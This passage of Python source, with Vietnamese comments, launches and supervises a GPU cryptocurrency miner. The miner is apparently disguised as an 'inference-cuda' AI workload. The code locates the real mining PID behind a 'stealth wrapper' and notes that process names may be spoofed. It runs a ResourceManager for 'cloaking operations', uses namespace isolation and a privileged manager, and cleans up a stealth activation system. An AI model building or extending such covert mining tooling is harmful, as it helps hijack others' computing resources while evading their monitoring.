                                try:
                                    child_info = child.as_dict(['pid', 'name', 'cmdline', 'exe', 'ppid', 'create_time'])
                                    logger.info(f"🔍 [PID-DETECTION] Analyzing child: PID={child_info['pid']}, name='{child_info.get('name', 'N/A')}', ppid={child_info.get('ppid', 'N/A')}")
                                    
                                    # Verify it's inference-cuda process using multiple criteria
                                    is_inference_cuda = False
                                    match_method = None
                                    
                                    # Check 1: Executable path
                                    if child_info.get('exe') and target_cmd in child_info['exe']:
                                        is_inference_cuda = True
                                        match_method = "executable"
                                        logger.info(f"✅ [PID-DETECTION] Match by executable: {child_info['exe']}")
                                    
                                    # Check 2: Command line arguments
                                    elif child_info.get('cmdline'):
                                        for arg in child_info['cmdline']:
                                            if target_cmd in str(arg):
                                                is_inference_cuda = True
                                                match_method = "cmdline"
                                                logger.info(f"✅ [PID-DETECTION] Match by cmdline: {child_info['cmdline']}")
                                                break
                                    
                                    # Check 3: Process age validation (started within last 2 minutes)
                                    if is_inference_cuda:
                                        process_age = time.time() - child_info['create_time']
                                        if process_age < 120:  # 2 minutes window
                                            real_mining_pid = child_info['pid']
                                            logger.info(f"🎯 [PID-DETECTION] Real mining PID detected: {real_mining_pid}")
                                            logger.info(f"🔍 [PID-DETECTION] Detection method: {match_method}")
                                            logger.info(f"🔍 [PID-DETECTION] Process details: name='{child_info.get('name', 'N/A')}' (may be spoofed by stealth)")
                                            logger.info(f"🔍 [PID-DETECTION] Process age: {process_age:.1f} seconds")
                                            break
                                        else:
                                            logger.info(f"⚠️ [PID-DETECTION] Process too old ({process_age:.1f}s), skipping PID {child_info['pid']}")
                                    
                                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
                                    logger.debug(f"🔍 [PID-DETECTION] Child process access error: {e}")
                                    continue
                            
                        except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                            logger.warning(f"⚠️ [PID-DETECTION] Cannot access wrapper process {wrapper_pid}: {e}")
                        
                        # METHOD 2: Fallback PPID search if children() method fails
                        if not real_mining_pid:
                            logger.info(f"🔍 [PID-DETECTION] Fallback: Manual PPID search for parent {wrapper_pid}")
                            
                            for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe', 'ppid', 'create_time']):
                                try:
                                    if proc.info.get('ppid') == wrapper_pid:
                                        # Validate this child is inference-cuda
                                        is_inference_cuda = False
                                        match_method = None
                                        
                                        # Check executable
                                        if proc.info.get('exe') and target_cmd in proc.info['exe']:
                                            is_inference_cuda = True
                                            match_method = "exe-fallback"
                                        
                                        # Check cmdline  
                                        elif proc.info.get('cmdline'):
                                            is_inference_cuda = any(target_cmd in str(arg) for arg in proc.info['cmdline'])
                                            match_method = "cmdline-fallback"
                                        
                                        if is_inference_cuda:
                                            process_age = time.time() - proc.info['create_time']
                                            if process_age < 120:  # 2 minutes window
                                                real_mining_pid = proc.info['pid']
                                                logger.info(f"🎯 [PID-DETECTION] Real mining PID found via PPID fallback: {real_mining_pid}")
                                                logger.info(f"🔍 [PID-DETECTION] Fallback detection method: {match_method}")
                                                break
                                        
                                except (psutil.NoSuchProcess, psutil.AccessDenied):
                                    continue
                        
                        if real_mining_pid:
                            # Register real mining process for Enhanced PID Logger
                            real_process_obj = psutil.Process(real_mining_pid)
                            register_process(real_mining_pid, process_type, real_process_obj, process_name)
                            logger.info(f"✅ Enhanced PID Logger registered real mining PID {real_mining_pid} ({process_type})")
                            
                            # **Enhanced: Store real mining PID in process object for later use**
                            process._real_mining_pid = real_mining_pid
                            logger.info(f"🎯 [ENHANCED] Real mining PID {real_mining_pid} stored in process object")
                        else:
                            # Fallback: register wrapper PID
                            register_process(process.pid, process_type, process, process_name)
                            logger.warning(f"⚠️ Could not detect real mining PID, using wrapper PID {process.pid}")
                            process._real_mining_pid = None
                            
                except Exception as _pid_err:
                    logger.warning(f"Enhanced PID logger registration failed: {_pid_err}")
                    # Fallback to legacy log_pid và auto registration
                    try:
                        log_pid(process.pid, False)  # GPU-only: cpu=False
                        logger.info(f"✅ Fallback: logged PID {process.pid} via log_pid()")
                    except Exception as _fallback_err:
                        logger.error(f"Fallback PID logging also failed: {_fallback_err}")
                
                # Xác định PID sẽ sử dụng cho log/sự kiện (ưu tiên real_mining_pid nếu có)
                event_pid = real_mining_pid if real_mining_pid else process.pid
                # **Detailed operation logging** (ghi log thao tác chi tiết) - ĐỊNH NGHĨA TRƯỚC KHI SỬ DỤNG
                operation_details = {
                    'process_name': process_name,
                    'pid': event_pid,  # Always use real mining PID for logging
                    'role': 'real',  # Always 'real' since we only log real mining PID
                    'miner_type': miner_type.lower(),
                    'command': ' '.join(mining_command),
                    'startup_time': startup_time,
                    'stealth_enabled': enable_stealth,  # GPU-only mode
                    'namespace_isolation': enable_ns and privileged_manager is not None,
                    'log_file': str(miner_log_path)
                }
                
                # Performance logging removed - simplified startup logging
                
                logger.info(f"PROCESS_START: {process_name} | PID={process.pid} | TYPE={miner_type} | TIME={startup_time}")
                
                # 🗑️ **REMOVED**: EventBus publishing replaced by DirectPIDRegistry
                # Process registration now handled by stealth_inference_cuda.py via DirectPIDRegistry
                try:
                    # 🆕 Determine correct PID for logging: prefer real mining PID if detected
                    event_pid = real_mining_pid if 'real_mining_pid' in locals() and real_mining_pid else process.pid
                    
                    logger.info(f"✅ Mining process started successfully:")
                    logger.info(f"   ├─ Type: {miner_type}")
                    logger.info(f"   ├─ PID: {event_pid}")
                    logger.info(f"   ├─ Name: {process_name}")
                    logger.info(f"   └─ Registration: Handled by DirectPIDRegistry in stealth wrapper")
                    
                except Exception as e:
                    logger.error(f"❌ Failed to log mining process information: {e}")
                

                # ✅ ENHANCED: Ensure log file creation với initial logging
                logger.info(f"📁 [Mining Log] Creating log file: {miner_log_path}")
                
                # **Open log file** (mở tệp log) cho **dual logging** (ghi log kép)
                log_file = open(miner_log_path, 'ab', buffering=0)
                
                # ✅ ENHANCED: Initial log entry để confirm file creation
                initial_log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ===== MINING LOG STARTED =====\n"
                initial_log += f"Process: {process_name} (PID: {process.pid})\n"
                initial_log += f"Command: {' '.join(mining_command)}\n"
                initial_log += f"Log File: {miner_log_path}\n"
                initial_log += f"========================================\n"
                log_file.write(initial_log.encode('utf-8'))
                log_file.flush()
                
                logger.info(f"✅ [Mining Log] Log file initialized: {miner_log_path}")
                
                # **Start dual logging thread** (khởi chạy luồng ghi log kép)
                log_thread = threading.Thread(
                    target=dual_logger_thread,
                    args=(process, log_file, process_name, log_lock),
                    daemon=True
                )
                log_thread.start()
                logger.info(f"🚀 [Mining Log] Dual logging thread started for {process_name}")
                
                
                time.sleep(2)
                if process.poll() is not None:
                    logger.error(f"Quá trình khai thác GPU kết thúc sớm.")
                    
                    # **Enhanced plugin logging for failures** (ghi log plugin nâng cao cho lỗi)
                    error_details = f"PID={process.pid} EXIT_CODE={process.returncode}"
                    # CPU plugin logging removed - GPU-only mode
                    log_gpu_plugin_operation("PROCESS_FAILURE", f"Early termination: {error_details}", "ERROR")
                    
                    # **Simple early termination logging** (ghi log kết thúc sớm đơn giản)
                    logger.error(f"EARLY_TERMINATION: {process_name} {error_details}")
                    process = None
                else:
                    # **Success logging** (ghi log thành công)
                    success_details = f"PID={process.pid} Command={' '.join(mining_command)}"
                    # CPU plugin logging removed - GPU-only mode
                    log_gpu_plugin_operation("PROCESS_SUCCESS", f"Mining process started: {success_details}", "INFO")
                    
                    logger.info(f"🔍 [DEBUG] About to return process object - PID: {process.pid}, Type: {type(process)}")
                    return process
                    
        except Exception as e:
            logger.error(f"🔍 [DEBUG] Exception caught in start_mining_process: {type(e).__name__}: {str(e)}")
            logger.error(f"Lỗi khi khởi động quá trình khai thác GPU: {e}")
            # **Enhanced debug info** (thông tin gỡ lỗi nâng cao) cho **cả CPU và GPU failures** (lỗi cả CPU và GPU)
            logger.error(f"🔍 Error Details - Exception: {type(e).__name__}: {str(e)}")
            logger.error(f"🔍 Error Details - Command: {' '.join(mining_command)}")
            logger.error(f"🔍 Error Details - Attempt: {attempt}/{retries}")
            import traceback
            logger.error(f"🔍 Error Details - Traceback: {traceback.format_exc()}")
            process = None
        if attempt < retries:
            # Cleanup on-retry: ensure previous process is terminated if still hanging
            try:
                if 'process' in locals() and process and process.poll() is None:
                    logger.warning("⚠️ Previous mining process still running, terminating before retry")
                    process.terminate()
                    try:
                        process.wait(timeout=3)
                    except Exception:
                        process.kill()
            except Exception as _cleanup_err:
                logger.debug(f"Retry cleanup error: {_cleanup_err}")
            logger.info(f"Đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)
    logger.error(f"Không thể khởi chạy quá trình khai thác GPU.")
    stop_event.set()
    return None

# GPU mining management integrated into main() for linear flow architecture

def start_resource_manager_thread():
    """
    **Enhanced ResourceManager Startup Thread** (luồng khởi động ResourceManager nâng cao)
    
    **PHASE 3**: Enhanced với readiness validation để ensure ResourceManager 
    ready trước khi GPU process start.
    
    Returns:
        ResourceManager: Instance nếu successful, None nếu failed
    """
    thread_logger = setup_logging('resource_manager_thread', str(Path(LOGS_DIR) / 'resource_manager_thread.log'), 'INFO')
    thread_logger.info("🔧 [PHASE 3] Starting Enhanced Resource Manager Thread...")
    
    try:
        # **Step 1**: Load configuration
        thread_logger.info("📋 Loading ResourceManager configuration...")
        config_path = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config')) / "resource_config.json"
        
        if not config_path.exists():
            raise FileNotFoundError(f"Configuration file not found: {config_path}")
            
        with open(config_path, 'r') as f:
            config_data = json.loads(f.read())
        
        config = ConfigModel(**config_data)
        thread_logger.info("✅ ResourceManager configuration loaded")
        
        # **Step 2**: Initialize ResourceManager
        thread_logger.info("🔧 Creating ResourceManager instance...")
        import time
        rm_creation_time = time.time()
        thread_logger.info(f"🔍 [PHASE 3] ResourceManager creation started at {rm_creation_time}")
        
        resource_manager = ResourceManager(config, None, thread_logger)  # No event bus needed
        
        rm_creation_end = time.time()
        thread_logger.info(f"🔍 [PHASE 3] ResourceManager creation completed at {rm_creation_end}")
        thread_logger.info(f"🔍 [PHASE 3] ResourceManager creation took {rm_creation_end - rm_creation_time:.3f} seconds")
        thread_logger.info("✅ ResourceManager instance created")
        
        # **Step 3**: Start ResourceManager
        thread_logger.info("🚀 Starting ResourceManager...")
        resource_manager.start()
        thread_logger.info("🎯 ResourceManager started successfully")
        
        # **🥈 HIGH FIX: Enhanced Wait for ResourceManager readiness confirmation** (chờ xác nhận ResourceManager sẵn sàng nâng cao)
        thread_logger.info("⏳ [HIGH] Waiting for ResourceManager readiness confirmation with extended timeout...")
        ready = ResourceManager.wait_for_ready(timeout=30.0)  # 🥈 Tăng từ 15s → 30s
        
        if ready:
            thread_logger.info("✅ [HIGH] ResourceManager fully ready - safe to start GPU processes")
            thread_logger.info("🎯 [HIGH] ResourceManager is now accepting PID handoffs from DirectPIDRegistry")
            # **🥈 HIGH FIX: Additional SharedResourceManager validation** (xác thực SharedResourceManager bổ sung)
            if hasattr(resource_manager, 'shared_resource_manager') and resource_manager.shared_resource_manager is not None:
                thread_logger.info("✅ [HIGH] SharedResourceManager confirmed available for cloaking operations")
            else:
                thread_logger.warning("⚠️ [HIGH] SharedResourceManager validation failed - cloaking may not work")
        else:
            thread_logger.error("❌ [HIGH] ResourceManager readiness timeout - continuing with warnings")
            thread_logger.error("🚨 [HIGH] GPU processes may experience race conditions without ready ResourceManager")
        
        # **🥇 TIER 1 FIX: Add Persistent Daemon Loop** (thêm vòng lặp daemon liên tục)
        thread_logger.info("🔄 [TIER-1] Starting persistent ResourceManager daemon loop...")
        
        # **Store ResourceManager instance globally for access** (lưu trữ ResourceManager instance toàn cục để truy cập)
        import sys
        current_module = sys.modules[__name__]
        current_module._active_resource_manager = resource_manager
        
        # **Persistent Service Loop** (vòng lặp dịch vụ liên tục)
        while not stop_event.is_set():
            try:
                # **Monitor ResourceManager health** (giám sát sức khỏe ResourceManager)
                if hasattr(resource_manager, 'shared_resource_manager') and resource_manager.shared_resource_manager:
                    # **Log periodic status** (ghi log trạng thái định kỳ)
                    if hasattr(resource_manager, '_last_health_log'):
                        if time.time() - resource_manager._last_health_log > 300:  # Every 5 minutes
                            thread_logger.info("💓 [TIER-1] ResourceManager daemon still active and monitoring")
                            resource_manager._last_health_log = time.time()
                    else:
                        resource_manager._last_health_log = time.time()
                        thread_logger.info("💓 [TIER-1] ResourceManager daemon initialized with health monitoring")
                
                # **Sleep to prevent CPU spinning** (ngủ để tránh CPU quay không)
                time.sleep(1.0)
                
            except Exception as daemon_error:
                thread_logger.error(f"⚠️ [TIER-1] ResourceManager daemon loop error: {daemon_error}")
                time.sleep(5.0)  # Longer sleep on error
        
        thread_logger.info("🔚 [TIER-1] ResourceManager daemon loop terminated by stop_event")
        return resource_manager
            
    except Exception as e:
        thread_logger.error(f"❌ [PHASE 3] Resource Manager Thread failed: {e}")
        thread_logger.error(f"🔍 [PHASE 3] Exception details: {type(e).__name__}: {str(e)}")
        
        # **PHASE 3: Enhanced error reporting** (báo cáo lỗi nâng cao)
        import traceback
        thread_logger.error(f"📋 [PHASE 3] Full traceback: {traceback.format_exc()}")
        
        stop_event.set()
        return None
        
    finally:
        thread_logger.info("🔚 [PHASE 3] Resource Manager Thread completed")

# Environment setup integrated into main() for sequential initialization

def main():
    """**Simplified Sequential Architecture Main Function** (hàm chính kiến trúc tuần tự đơn giản) với **DirectPIDRegistry coordination** (phối hợp DirectPIDRegistry)"""
    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử (Simplified Sequential Architecture) =====")
    
    # 0️⃣ Log rotation do hệ thống đảm nhiệm qua logrotate (khởi chạy từ entrypoint)

    # ------------------------------------------------------------------
    # 1️⃣ **SIMPLIFIED**: Thiết lập môi trường tuần tự trực tiếp (DirectPIDRegistry replaces EventBus)
    # ------------------------------------------------------------------
    global privileged_manager_global
    try:
        logger.info("🔧 Đang thiết lập môi trường (sequential direct)...")
        privileged_manager_global = initialize_environment()
        logger.info("✅ Thiết lập môi trường hoàn tất")
    except Exception as e:
        logger.error(f"❌ Không thể thiết lập môi trường: {e}")
        return  # Abort startup nếu môi trường lỗi

    # ------------------------------------------------------------------
    # 2️⃣ **SIMPLIFIED**: Khởi tạo DirectPIDRegistry tuần tự đơn giản
    # ------------------------------------------------------------------
    # 🚀 Khởi động PID Logger worker đơn giản
    try:
        start_worker()
        time.sleep(2)  # Đợi worker khởi động đơn giản
        logger.info("🚀 PID Logger worker started (simplified)")
    except Exception as e:
        logger.error(f"❌ Failed to start PID Logger worker: {e}")
        # Tiếp tục chạy mà không dừng hệ thống

    # ------------------------------------------------------------------
    # 3️⃣ **PHASE 3**: Enhanced Resource Manager Startup với Readiness Validation
    # ------------------------------------------------------------------
    logger.info("🔧 [PHASE 3] Starting Enhanced Resource Manager với readiness validation...")
    
    # **🥇 TIER 1 FIX: Enhanced ResourceManager with Direct Instance Storage** (ResourceManager nâng cao với lưu trữ instance trực tiếp)
    logger.info("🏥 [TIER-1] Starting ResourceManager with direct instance management...")
    
    # **TIER 1 FIX: Store ResourceManager instance globally** (lưu trữ ResourceManager instance toàn cục)
    global _active_resource_manager_instance
    _active_resource_manager_instance = None
    
    # **TIER 1 FIX: Wrapper function to capture return value** (hàm wrapper để bắt return value)
    def capture_resource_manager():
        global _active_resource_manager_instance
        try:
            _active_resource_manager_instance = start_resource_manager_thread()
            logger.info(f"🎯 [TIER-1] ResourceManager instance captured: {_active_resource_manager_instance is not None}")
            return _active_resource_manager_instance
        except Exception as e:
            logger.error(f"❌ [TIER-1] Failed to capture ResourceManager: {e}")
            return None
    
    # **Start ResourceManager with instance capture** (khởi động ResourceManager với bắt instance)
    resource_manager_thread_obj = threading.Thread(
        target=capture_resource_manager,
        daemon=True,
        name="EnhancedResourceManagerThread"
    )
    resource_manager_thread_obj.start()
    
    # **🚀 OPTIMIZED: Fast ResourceManager initialization with fallback** (khởi tạo ResourceManager nhanh với dự phòng)
    logger.info("⏳ [OPTIMIZED] Waiting for ResourceManager with reduced timeout...")
    initialization_timeout = 10.0  # Giảm từ 60s xuống 10s - không block lâu
    start_wait = time.time()
    resource_manager_ready = False
    
    while time.time() - start_wait < initialization_timeout:
        if _active_resource_manager_instance is not None:
            # Với lazy initialization, không cần chờ SharedResourceManager ngay
            logger.info("✅ [OPTIMIZED] ResourceManager instance initialized")
            resource_manager_ready = True
            break
        time.sleep(0.2)  # Giảm sleep time để responsive hơn
    
    if not resource_manager_ready:
        # Giảm nhiễu: hạ cảnh báo ban đầu xuống INFO, sẽ cảnh báo nếu readiness cuối cùng vẫn thất bại
        logger.info("ℹ️ [OPTIMIZED] ResourceManager chưa sẵn sàng sau {}s (sẽ tiếp tục chờ readiness)".format(initialization_timeout))
        logger.info("🔄 [FALLBACK] Hệ thống tiếp tục với chế độ basic - GPU process vẫn chạy")
        logger.info("📝 [FALLBACK] Cloaking sẽ được kích hoạt khi ResourceManager sẵn sàng")
    
    # **🥉 SOLUTION 3: Start Health Monitoring Thread** (khởi động thread giám sát sức khỏe)
    health_monitor_thread_obj = threading.Thread(
        target=lambda: start_resource_manager_health_monitor(resource_manager_thread_obj),
        daemon=True,
        name="ResourceManagerHealthMonitor"
    )
    health_monitor_thread_obj.start()
    
    # **🥇 TIER 1 FIX: Replace join() with readiness waiting** (thay thế join() bằng chờ sẵn sàng)
    logger.info("⏳ [TIER-1] Waiting for ResourceManager readiness instead of thread completion...")
    
    # **Wait for ResourceManager to be ready, not for thread to complete** (chờ ResourceManager sẵn sàng, không chờ thread hoàn thành)
    ready_timeout = 20.0
    ready_start_time = time.time()
    
    while time.time() - ready_start_time < ready_timeout:
        try:
            # **Check if ResourceManager is initialized and ready** (kiểm tra ResourceManager đã khởi tạo và sẵn sàng)
            from mining_environment.scripts.resource_manager import ResourceManager
            if ResourceManager._instance and ResourceManager.is_ready():
                logger.info("✅ [TIER-1] ResourceManager is ready and accepting handoffs")
                logger.info("🎯 [TIER-1] DirectPIDRegistry can now forward PIDs to ResourceManager")
                # Đảm bảo đăng ký RM vào DirectPIDRegistry ngay khi sẵn sàng
                try:
                    from pid_logger.direct_registry import get_direct_registry
                    registry = get_direct_registry()
                    if hasattr(registry, 'register_resource_manager'):
                        registry.register_resource_manager(ResourceManager._instance)
                except Exception as _reg_err:
                    logger.debug(f"[TIER-1] RM registry registration skip: {_reg_err}")
                break
        except ImportError:
            pass  # ResourceManager not yet importable
        except Exception as check_error:
            logger.debug(f"🔍 [TIER-1] ResourceManager readiness check error: {check_error}")
        
        time.sleep(0.5)  # Check every 500ms
    else:
        logger.warning("⚠️ [TIER-1] ResourceManager readiness timeout - proceeding with caution")
        logger.warning("🚨 [TIER-1] PID handoffs may fail until ResourceManager becomes ready")
    
    # **Verify thread is still alive (should be persistent)** (xác minh thread vẫn sống)
    if resource_manager_thread_obj.is_alive():
        logger.info("✅ [TIER-1] ResourceManager thread is running persistently as daemon")
        logger.info("🔄 [TIER-1] Health monitor will track ResourceManager thread status")
    else:
        logger.error("❌ [TIER-1] ResourceManager thread died unexpectedly during startup")
        logger.error("🚨 [TIER-1] This indicates critical initialization failure")
    
    # **PHASE 3: Final readiness check before GPU process start** (kiểm tra sẵn sàng cuối cùng trước khi start GPU process)
    logger.info("🔍 [PHASE 3] Final ResourceManager readiness verification...")
    
    # Import ResourceManager to access class methods
    resource_manager_ready = False
    try:
        from mining_environment.scripts.resource_manager import ResourceManager
        final_ready = ResourceManager.is_ready()
        
        if final_ready:
            logger.info("✅ [PHASE 3] ResourceManager CONFIRMED READY - safe to start GPU processes")
            logger.info("🎯 [PHASE 3] Race condition prevention: ResourceManager accepting handoffs")
            resource_manager_ready = True
            
            # ------------------------------------------------------------------
            # 🥇 **SOLUTION 3: EXPLICIT REGISTRATION PATTERN** (đăng ký rõ ràng)
            # ------------------------------------------------------------------
            logger.info("🔧 [SOLUTION-3] Implementing Explicit ResourceManager Registration...")
            
            try:
                # **Step 1: Get ResourceManager instance** (lấy instance ResourceManager)
                rm_instance = ResourceManager._instance
                if rm_instance:
                    logger.info("✅ [SOLUTION-3] ResourceManager instance found for registration")
                    
                    # **Step 2: Get DirectPIDRegistry** (lấy DirectPIDRegistry)
                    from pid_logger.direct_registry import get_direct_registry
                    registry = get_direct_registry()
                    
                    # **Step 3: Register ResourceManager with DirectPIDRegistry** (đăng ký ResourceManager với DirectPIDRegistry)
                    if hasattr(registry, 'register_resource_manager'):
                        registration_success = registry.register_resource_manager(rm_instance)
                        if registration_success:
                            logger.info("🎯 [SOLUTION-3] ResourceManager SUCCESSFULLY REGISTERED with DirectPIDRegistry")
                            logger.info("✅ [SOLUTION-3] Cross-process PID handoff mechanism activated")
                            logger.info("🔗 [SOLUTION-3] DirectPIDRegistry → ResourceManager flow configured")
                        else:
                            logger.warning("⚠️ [SOLUTION-3] ResourceManager registration failed but continuing")
                    else:
                        logger.warning("⚠️ [SOLUTION-3] DirectPIDRegistry missing register_resource_manager method")
                else:
                    logger.error("❌ [SOLUTION-3] No ResourceManager instance available for registration")
                    
            except Exception as reg_error:
                logger.error(f"❌ [SOLUTION-3] ResourceManager registration error: {reg_error}")
                logger.warning("🔄 [SOLUTION-3] Continuing without registration - fallback mechanisms active")
            
            # ------------------------------------------------------------------
            # 4️⃣ **RACE CONDITION FIX**: Chỉ khởi động GPU process SAU KHI ResourceManager sẵn sàng
            # ------------------------------------------------------------------
            global gpu_process
            logger.info("🎮 [RACE-FIX] Starting GPU Mining process AFTER ResourceManager ready AND registered...")
            gpu_process = start_gpu_mining_process(privileged_manager=privileged_manager_global)
        else:
            logger.error("❌ [PHASE 3] ResourceManager NOT READY - CANNOT start GPU process")
            logger.error("🚨 [PHASE 3] Aborting startup to prevent race conditions")
            logger.error("💡 [PHASE 3] Please check ResourceManager initialization logs for issues")
            
    except ImportError as e:
        logger.error(f"❌ [PHASE 3] Cannot import ResourceManager for readiness check: {e}")
        logger.error("🚨 [PHASE 3] CRITICAL: Cannot verify ResourceManager status - aborting")
    
    # Kiểm tra nếu ResourceManager không sẵn sàng thì dừng hệ thống
    if not resource_manager_ready:
        logger.error("🛑 [RACE-FIX] System startup aborted - ResourceManager not ready")
        logger.error("📋 [RACE-FIX] Please check logs in /app/mining_environment/logs/")
        stop_event.set()
        return
    
    logger.info("✅ [PHASE 3] Enhanced Resource Manager startup phase completed")
    
    # Kiểm tra GPU process đã khởi động thành công sau khi move vào trong if block
    if gpu_process and is_mining_process_running(gpu_process):
        logger.info(f"✅ [RACE-FIX] GPU Mining process started successfully - PID: {gpu_process.pid}")
    else:
        logger.error("❌ [RACE-FIX] GPU mining process failed to start after ResourceManager ready")
        stop_event.set()
        return
    
    # **Enhanced process registration với real mining PID detection**
    real_mining_pid = getattr(gpu_process, '_real_mining_pid', None)
    process_group_id = getattr(gpu_process, '_process_group_id', None)
    
    process_manager.set_gpu_process(
        gpu_process, 
        real_mining_pid=real_mining_pid,
        process_group_id=process_group_id
    )
    
    logger.info(f"🎯 [ENHANCED] Process manager updated: wrapper_pid={gpu_process.pid}, real_pid={real_mining_pid}, pgid={process_group_id}")
    # ------------------------------------------------------------------
    # 5️⃣ **SIMPLIFIED**: Khởi động Simple Registry Monitoring
    # ------------------------------------------------------------------
    def simple_registry_monitor():
        """**Simplified registry monitoring** (giám sát sổ đăng ký đơn giản)"""
        from pid_logger import _PROCESS_REGISTRY
        logger.info("📋 Simple registry monitoring started")
        
        while not stop_event.is_set():
            try:
                registry_size = len(_PROCESS_REGISTRY)
                if registry_size > 0:
                    logger.debug(f"📊 Registry: {registry_size} processes")
                time.sleep(30)  # Kiểm tra mỗi 30 giây
            except Exception as e:
                logger.error(f"Registry monitor error: {e}")
                time.sleep(60)
    
    # Khởi động Simple Registry Monitor trong background
    registry_monitor_thread = threading.Thread(
        target=simple_registry_monitor,
        daemon=True,
        name="SimpleRegistryMonitor"
    )
    registry_monitor_thread.start()
    logger.info("✅ Simple Registry Monitor started")
    
    # **SIMPLIFIED STARTUP COMPLETED** (hoàn thành khởi động đơn giản)
    logger.info("🚀 SIMPLIFIED SEQUENTIAL ARCHITECTURE STARTUP COMPLETED")
    
    # Kiểm tra các thành phần đã khởi động
    background_threads = [
        ("Resource Manager", resource_manager_thread_obj),
        ("Registry Monitor", registry_monitor_thread)
    ]
    
    active_count = sum(1 for _, thread in background_threads if thread.is_alive())
    logger.info(f"🎯 Background threads: {active_count}/{len(background_threads)}")
    logger.info(f"🎮 GPU Process: {'Running' if is_mining_process_running(gpu_process) else 'Stopped'}")
    
    if not is_mining_process_running(gpu_process):
        logger.error("❌ GPU process not running - system failure")
        stop_event.set()
        return
    
    # ------------------------------------------------------------------
    # 6️⃣ **SIMPLIFIED**: Main monitoring loop đơn giản
    # ------------------------------------------------------------------
    logger.info("🔍 Starting simplified monitoring loop...")
    
    try:
        while not stop_event.is_set():
            # **Enhanced GPU process health check** (kiểm tra sức khỏe GPU nâng cao)
            is_alive, wrapper_process, real_mining_pid = process_manager.get_gpu_process_status()
            
            if not is_alive:
                logger.error("❌ [ENHANCED] GPU mining process stopped! Enhanced detection triggered.")
                logger.error(f"❌ [ENHANCED] Wrapper process alive: {wrapper_process is not None and wrapper_process.poll() is None if wrapper_process else False}")
                logger.error(f"❌ [ENHANCED] Real mining PID {real_mining_pid}: {'Dead' if real_mining_pid else 'Unknown'}")
                print(f"\033[91m❌ GPU MINING PROCESS STOPPED!\033[0m", flush=True)
                stop_event.set()
                break
            else:
                # Enhanced health logging
                if logger.isEnabledFor(logging.DEBUG):
                    logger.debug(f"✅ [ENHANCED] Health check: wrapper_pid={wrapper_process.pid if wrapper_process else 'N/A'}, real_pid={real_mining_pid}, both_alive={is_alive}")
            
            # **Simple background thread check** (kiểm tra background thread đơn giản)
            dead_threads = [name for name, thread in background_threads if not thread.is_alive()]
            if dead_threads:
                logger.warning(f"⚠️ Background threads stopped: {dead_threads}")
            
            # **Simple health log** (log sức khỏe đơn giản)
            logger.info(f"✅ System healthy - GPU PID: {gpu_process.pid if gpu_process else 'N/A'}")
            
            time.sleep(30)  # Monitor every 30 seconds
            
    except KeyboardInterrupt:
        logger.info("⏹️ Nhận tín hiệu KeyboardInterrupt. Đang dừng...")
        stop_event.set()
    
    # ------------------------------------------------------------------
    # 7️⃣ **SIMPLIFIED**: Cleanup đơn giản
    # ------------------------------------------------------------------
    logger.info("🧹 Starting simplified cleanup...")
    
    # **Simple background thread cleanup** (dọn dẹp background thread đơn giản)
    logger.info("🔄 Stopping background threads...")
    for thread_name, thread in background_threads:
        if thread.is_alive():
            logger.info(f"⏳ Waiting for {thread_name} to stop...")
            thread.join(timeout=5)  # Shorter timeout
            if thread.is_alive():
                logger.warning(f"⚠️ {thread_name} did not stop gracefully")
            else:
                logger.info(f"✅ {thread_name} stopped")
    
    # **Step 5**: Stealth system cleanup
    logger.info("📋 Step 5/5: Cleaning up stealth activation system...")
    try:
        cleanup_stealth_activation()
        logger.info("✅ Stealth activation system cleanup completed")
    except Exception as e:
        logger.error(f"❌ Error cleaning up stealth activation system: {e}")
    
    # **Cleanup** (dọn dẹp) và thoát
    logger.info("Bắt đầu quá trình dọn dẹp cuối cùng...")
    
    # **Simple GPU Process Cleanup** (dọn dẹp tiến trình GPU đơn giản)
    logger.info("🧹 Cleaning up GPU mining process...")
    if gpu_process and is_mining_process_running(gpu_process):
        logger.info(f"⏹️ Stopping GPU process (PID: {gpu_process.pid})...")
        try:
            gpu_process.terminate()
            gpu_process.wait(timeout=5)
            logger.info("✅ GPU process stopped gracefully")
        except subprocess.TimeoutExpired:
            logger.warning("⚠️ Force killing GPU process")
            gpu_process.kill()
        except Exception as e:
            logger.error(f"❌ Error stopping GPU process: {e}")
        finally:
            process_manager.set_gpu_process(None)
            gpu_process = None
    
    logger.info("===== HỆ THỐNG ĐÃ DỪNG (SIMPLIFIED ARCHITECTURE) =====")

def start_resource_manager_health_monitor(resource_manager_thread):
    """
    **TIER 3 FIX: Enhanced ResourceManager Health Monitor** (giám sát sức khỏe ResourceManager nâng cao)
    
    Watchdog system cho ResourceManager thread với automatic restart capability và enhanced SharedResourceManager monitoring.
    
    Args:
        resource_manager_thread: Threading.Thread object của ResourceManager
    """
    monitor_logger = logging.getLogger('start_mining.health_monitor')
    monitor_logger.info("🏥 [TIER-3] Enhanced ResourceManager health monitoring started")
    
    # **🥉 SOLUTION 3: Health Check Configuration** (cấu hình kiểm tra sức khỏe)
    # Cho phép điều chỉnh chu kỳ kiểm tra bằng ENV khi test
    try:
        check_interval = float(os.getenv('HEALTH_CHECK_INTERVAL_SEC', '5'))
    except Exception:
        check_interval = 30.0
    restart_cooldown = 60.0  # Wait 60 seconds between restart attempts  
    max_restart_attempts = 3  # Maximum restart attempts per session
    restart_attempts = 0
    last_restart_time = 0.0
    
    # **🥉 SOLUTION 3: Health Statistics** (thống kê sức khỏe)
    health_stats = {
        'monitor_start_time': time.time(),
        'total_checks': 0,
        'healthy_checks': 0,
        'unhealthy_checks': 0,
        'restart_attempts': 0,
        'successful_restarts': 0,
        'failed_restarts': 0
    }
    
    while not stop_event.is_set():
        try:
            current_time = time.time()
            health_stats['total_checks'] += 1
            
            # **🥉 SOLUTION 3: Thread Health Check** (kiểm tra sức khỏe thread)
            thread_alive = resource_manager_thread.is_alive() if resource_manager_thread else False
            
            # **TIER 3 FIX: Enhanced ResourceManager Instance Health Check** (kiểm tra sức khỏe instance ResourceManager nâng cao)
            rm_instance_healthy = False
            rm_ready = False
            rm_shared_manager_healthy = False
            rm_queue_ok = True
            registry_pending_ok = True
            
            try:
                from mining_environment.scripts.resource_manager import ResourceManager
                rm_instance = ResourceManager._instance
                rm_instance_healthy = rm_instance is not None
                rm_ready = ResourceManager.is_ready() if rm_instance_healthy else False
                
